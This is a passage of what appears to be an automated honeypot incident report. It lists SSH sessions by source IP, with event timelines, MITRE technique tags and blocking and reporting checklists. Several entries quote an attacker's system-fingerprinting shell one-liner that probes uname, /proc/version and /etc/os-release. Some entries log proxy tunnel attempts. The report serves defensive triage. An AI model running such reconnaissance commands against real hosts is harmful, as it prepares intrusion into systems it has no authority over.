- [ ] Submit `60.223.245[.]120` to AbuseIPDB if not already reported
- [ ] Block `60.223.245[.]120` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2df81cf1bfea

| Field | Detail |
|---|---|
| **Source IP** | `223.82.97[.]51` |
| **First Seen** | 2026-07-08 18:08 |
| **Last Seen** | 2026-07-08 18:08 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:08:39` | `cowrie.session.connect` |
| `2026-07-08 18:08:41` | `cowrie.client.version` |
| `2026-07-08 18:08:41` | `cowrie.client.kex` |
| `2026-07-08 18:08:44` | `cowrie.login.success` |
| `2026-07-08 18:08:45` | `cowrie.direct-tcpip.request` |
| `2026-07-08 18:08:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.82.97[.]51` to AbuseIPDB if not already reported
- [ ] Block `223.82.97[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-441e0b1bd0c7

| Field | Detail |
|---|---|
| **Source IP** | `50.217.40[.]11` |
| **First Seen** | 2026-07-08 18:08 |
| **Last Seen** | 2026-07-08 18:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:08:48` | `cowrie.session.connect` |
| `2026-07-08 18:08:48` | `cowrie.client.version` |
| `2026-07-08 18:08:48` | `cowrie.client.kex` |
| `2026-07-08 18:08:50` | `cowrie.login.success` |
| `2026-07-08 18:08:50` | `cowrie.direct-tcpip.request` |
| `2026-07-08 18:08:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.217.40[.]11` to AbuseIPDB if not already reported
- [ ] Block `50.217.40[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-618c0575119f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 18:10 |
| **Last Seen** | 2026-07-08 18:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:10:17` | `cowrie.session.connect` |
| `2026-07-08 18:10:17` | `cowrie.client.version` |
| `2026-07-08 18:10:17` | `cowrie.client.kex` |
| `2026-07-08 18:10:18` | `cowrie.login.success` |
| `2026-07-08 18:10:19` | `cowrie.session.params` |
| `2026-07-08 18:10:19` | `cowrie.command.input` |
| `2026-07-08 18:10:19` | `cowrie.command.input` |
| `2026-07-08 18:10:19` | `cowrie.command.input` |
| `2026-07-08 18:10:19` | `cowrie.command.input` |
| `2026-07-08 18:10:19` | `cowrie.command.input` |
| `2026-07-08 18:10:19` | `cowrie.command.success` |
| `2026-07-08 18:10:19` | `cowrie.command.input` |
| `2026-07-08 18:10:19` | `cowrie.command.input` |
| `2026-07-08 18:10:19` | `cowrie.command.input` |
| `2026-07-08 18:10:19` | `cowrie.command.input` |
| `2026-07-08 18:10:19` | `cowrie.log.closed` |
| `2026-07-08 18:10:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63e75752a125

| Field | Detail |
|---|---|
| **Source IP** | `220.246.42[.]227` |
| **First Seen** | 2026-07-08 18:10 |
| **Last Seen** | 2026-07-08 18:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:10:17` | `cowrie.session.connect` |
| `2026-07-08 18:10:18` | `cowrie.client.version` |
| `2026-07-08 18:10:18` | `cowrie.client.kex` |
| `2026-07-08 18:10:20` | `cowrie.login.success` |
| `2026-07-08 18:10:21` | `cowrie.direct-tcpip.request` |
| `2026-07-08 18:10:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.246.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `220.246.42[.]227` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7889ac66f167

| Field | Detail |
|---|---|
| **Source IP** | `153.37.177[.]219` |
| **First Seen** | 2026-07-08 18:11 |
| **Last Seen** | 2026-07-08 18:12 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:11:51` | `cowrie.session.connect` |
| `2026-07-08 18:11:52` | `cowrie.client.version` |
| `2026-07-08 18:11:52` | `cowrie.client.kex` |
| `2026-07-08 18:11:55` | `cowrie.login.success` |
| `2026-07-08 18:11:55` | `cowrie.direct-tcpip.request` |
| `2026-07-08 18:12:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.37.177[.]219` to AbuseIPDB if not already reported
- [ ] Block `153.37.177[.]219` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c339d7496e6

| Field | Detail |
|---|---|
| **Source IP** | `65.20.250[.]244` |
| **First Seen** | 2026-07-08 18:12 |
| **Last Seen** | 2026-07-08 18:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:12:05` | `cowrie.session.connect` |
| `2026-07-08 18:12:06` | `cowrie.client.version` |
| `2026-07-08 18:12:06` | `cowrie.client.kex` |
| `2026-07-08 18:12:07` | `cowrie.login.success` |
| `2026-07-08 18:12:08` | `cowrie.direct-tcpip.request` |
| `2026-07-08 18:12:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.250[.]244` to AbuseIPDB if not already reported
- [ ] Block `65.20.250[.]244` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1d7379b9187

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 18:12 |
| **Last Seen** | 2026-07-08 18:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:12:43` | `cowrie.session.connect` |
| `2026-07-08 18:12:43` | `cowrie.client.version` |
| `2026-07-08 18:12:43` | `cowrie.client.kex` |
| `2026-07-08 18:12:44` | `cowrie.login.success` |
| `2026-07-08 18:12:46` | `cowrie.session.params` |
| `2026-07-08 18:12:46` | `cowrie.command.input` |
| `2026-07-08 18:12:46` | `cowrie.command.input` |
| `2026-07-08 18:12:46` | `cowrie.command.input` |
| `2026-07-08 18:12:46` | `cowrie.command.input` |
| `2026-07-08 18:12:46` | `cowrie.command.input` |
| `2026-07-08 18:12:46` | `cowrie.command.success` |
| `2026-07-08 18:12:46` | `cowrie.command.input` |
| `2026-07-08 18:12:46` | `cowrie.command.input` |
| `2026-07-08 18:12:46` | `cowrie.command.input` |
| `2026-07-08 18:12:46` | `cowrie.command.input` |
| `2026-07-08 18:12:46` | `cowrie.log.closed` |
| `2026-07-08 18:12:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39fe04823739

| Field | Detail |
|---|---|
| **Source IP** | `65.20.158[.]10` |
| **First Seen** | 2026-07-08 18:13 |
| **Last Seen** | 2026-07-08 18:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:13:58` | `cowrie.session.connect` |
| `2026-07-08 18:13:58` | `cowrie.client.version` |
| `2026-07-08 18:13:58` | `cowrie.client.kex` |
| `2026-07-08 18:13:59` | `cowrie.login.success` |
| `2026-07-08 18:14:00` | `cowrie.direct-tcpip.request` |
| `2026-07-08 18:14:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.158[.]10` to AbuseIPDB if not already reported
- [ ] Block `65.20.158[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce3a47f1c4ed

| Field | Detail |
|---|---|
| **Source IP** | `114.30.223[.]119` |
| **First Seen** | 2026-07-08 18:14 |
| **Last Seen** | 2026-07-08 18:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:14:05` | `cowrie.session.connect` |
| `2026-07-08 18:14:06` | `cowrie.client.version` |
| `2026-07-08 18:14:06` | `cowrie.client.kex` |
| `2026-07-08 18:14:08` | `cowrie.login.success` |
| `2026-07-08 18:14:09` | `cowrie.direct-tcpip.request` |
| `2026-07-08 18:14:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.30.223[.]119` to AbuseIPDB if not already reported
- [ ] Block `114.30.223[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-806ac0e2b11c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 18:15 |
| **Last Seen** | 2026-07-08 18:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:15:11` | `cowrie.session.connect` |
| `2026-07-08 18:15:11` | `cowrie.client.version` |
| `2026-07-08 18:15:11` | `cowrie.client.kex` |
| `2026-07-08 18:15:13` | `cowrie.login.success` |
| `2026-07-08 18:15:14` | `cowrie.session.params` |
| `2026-07-08 18:15:14` | `cowrie.command.input` |
| `2026-07-08 18:15:14` | `cowrie.command.input` |
| `2026-07-08 18:15:14` | `cowrie.command.input` |
| `2026-07-08 18:15:14` | `cowrie.command.input` |
| `2026-07-08 18:15:14` | `cowrie.command.input` |
| `2026-07-08 18:15:14` | `cowrie.command.success` |
| `2026-07-08 18:15:14` | `cowrie.command.input` |
| `2026-07-08 18:15:14` | `cowrie.command.input` |
| `2026-07-08 18:15:14` | `cowrie.command.input` |
| `2026-07-08 18:15:14` | `cowrie.command.input` |
| `2026-07-08 18:15:14` | `cowrie.log.closed` |
| `2026-07-08 18:15:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-190d17683c61

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 18:17 |
| **Last Seen** | 2026-07-08 18:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:17:43` | `cowrie.session.connect` |
| `2026-07-08 18:17:43` | `cowrie.client.version` |
| `2026-07-08 18:17:43` | `cowrie.client.kex` |
| `2026-07-08 18:17:43` | `cowrie.login.success` |
| `2026-07-08 18:17:44` | `cowrie.session.params` |
| `2026-07-08 18:17:44` | `cowrie.command.input` |
| `2026-07-08 18:17:44` | `cowrie.command.input` |
| `2026-07-08 18:17:44` | `cowrie.command.input` |
| `2026-07-08 18:17:44` | `cowrie.command.input` |
| `2026-07-08 18:17:44` | `cowrie.command.input` |
| `2026-07-08 18:17:44` | `cowrie.command.success` |
| `2026-07-08 18:17:44` | `cowrie.command.input` |
| `2026-07-08 18:17:44` | `cowrie.command.input` |
| `2026-07-08 18:17:44` | `cowrie.command.input` |
| `2026-07-08 18:17:44` | `cowrie.command.input` |
| `2026-07-08 18:17:45` | `cowrie.log.closed` |
| `2026-07-08 18:17:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4a6fc506a8e

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-08 18:18 |
| **Last Seen** | 2026-07-08 18:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:18:29` | `cowrie.session.connect` |
| `2026-07-08 18:18:29` | `cowrie.client.version` |
| `2026-07-08 18:18:29` | `cowrie.client.kex` |
| `2026-07-08 18:18:30` | `cowrie.login.success` |
| `2026-07-08 18:18:31` | `cowrie.session.params` |
| `2026-07-08 18:18:31` | `cowrie.command.input` |
| `2026-07-08 18:18:31` | `cowrie.log.closed` |
| `2026-07-08 18:18:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58a4cac0ce7a

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-08 18:19 |
| **Last Seen** | 2026-07-08 18:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:19:15` | `cowrie.session.connect` |
| `2026-07-08 18:19:15` | `cowrie.client.version` |
| `2026-07-08 18:19:15` | `cowrie.client.kex` |
| `2026-07-08 18:19:16` | `cowrie.login.success` |
| `2026-07-08 18:19:16` | `cowrie.session.params` |
| `2026-07-08 18:19:16` | `cowrie.command.input` |
| `2026-07-08 18:19:17` | `cowrie.log.closed` |
| `2026-07-08 18:19:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59c93d912218

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 18:20 |
| **Last Seen** | 2026-07-08 18:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:20:13` | `cowrie.session.connect` |
| `2026-07-08 18:20:13` | `cowrie.client.version` |
| `2026-07-08 18:20:13` | `cowrie.client.kex` |
| `2026-07-08 18:20:14` | `cowrie.login.success` |
| `2026-07-08 18:20:16` | `cowrie.session.params` |
| `2026-07-08 18:20:16` | `cowrie.command.input` |
| `2026-07-08 18:20:16` | `cowrie.command.input` |
| `2026-07-08 18:20:16` | `cowrie.command.input` |
| `2026-07-08 18:20:16` | `cowrie.command.input` |
| `2026-07-08 18:20:16` | `cowrie.command.input` |
| `2026-07-08 18:20:16` | `cowrie.command.success` |
| `2026-07-08 18:20:16` | `cowrie.command.input` |
| `2026-07-08 18:20:16` | `cowrie.command.input` |
| `2026-07-08 18:20:16` | `cowrie.command.input` |
| `2026-07-08 18:20:16` | `cowrie.command.input` |
| `2026-07-08 18:20:16` | `cowrie.log.closed` |
| `2026-07-08 18:20:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b93fead6292

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 18:22 |
| **Last Seen** | 2026-07-08 18:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:22:41` | `cowrie.session.connect` |
| `2026-07-08 18:22:41` | `cowrie.client.version` |
| `2026-07-08 18:22:41` | `cowrie.client.kex` |
| `2026-07-08 18:22:42` | `cowrie.login.success` |
| `2026-07-08 18:22:44` | `cowrie.session.params` |
| `2026-07-08 18:22:44` | `cowrie.command.input` |
| `2026-07-08 18:22:44` | `cowrie.command.input` |
| `2026-07-08 18:22:44` | `cowrie.command.input` |
| `2026-07-08 18:22:44` | `cowrie.command.input` |
| `2026-07-08 18:22:44` | `cowrie.command.input` |
| `2026-07-08 18:22:44` | `cowrie.command.success` |
| `2026-07-08 18:22:44` | `cowrie.command.input` |
| `2026-07-08 18:22:44` | `cowrie.command.input` |
| `2026-07-08 18:22:44` | `cowrie.command.input` |
| `2026-07-08 18:22:44` | `cowrie.command.input` |
| `2026-07-08 18:22:44` | `cowrie.log.closed` |
| `2026-07-08 18:22:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89c7e98c8e28

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-08 18:24 |
| **Last Seen** | 2026-07-08 18:24 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:24:37` | `cowrie.session.connect` |
| `2026-07-08 18:24:40` | `cowrie.client.version` |
| `2026-07-08 18:24:40` | `cowrie.client.kex` |
| `2026-07-08 18:24:45` | `cowrie.login.success` |
| `2026-07-08 18:24:47` | `cowrie.session.params` |
| `2026-07-08 18:24:47` | `cowrie.command.input` |
| `2026-07-08 18:24:48` | `cowrie.log.closed` |
| `2026-07-08 18:24:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d691a7f75ed1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 18:25 |
| **Last Seen** | 2026-07-08 18:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:25:14` | `cowrie.session.connect` |
| `2026-07-08 18:25:14` | `cowrie.client.version` |
| `2026-07-08 18:25:14` | `cowrie.client.kex` |
| `2026-07-08 18:25:15` | `cowrie.login.success` |
| `2026-07-08 18:25:16` | `cowrie.session.params` |
| `2026-07-08 18:25:16` | `cowrie.command.input` |
| `2026-07-08 18:25:16` | `cowrie.command.input` |
| `2026-07-08 18:25:16` | `cowrie.command.input` |
| `2026-07-08 18:25:16` | `cowrie.command.input` |
| `2026-07-08 18:25:16` | `cowrie.command.input` |
| `2026-07-08 18:25:16` | `cowrie.command.success` |
| `2026-07-08 18:25:16` | `cowrie.command.input` |
| `2026-07-08 18:25:16` | `cowrie.command.input` |
| `2026-07-08 18:25:16` | `cowrie.command.input` |
| `2026-07-08 18:25:16` | `cowrie.command.input` |
| `2026-07-08 18:25:16` | `cowrie.log.closed` |
| `2026-07-08 18:25:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66193e7d2e04

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 18:27 |
| **Last Seen** | 2026-07-08 18:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
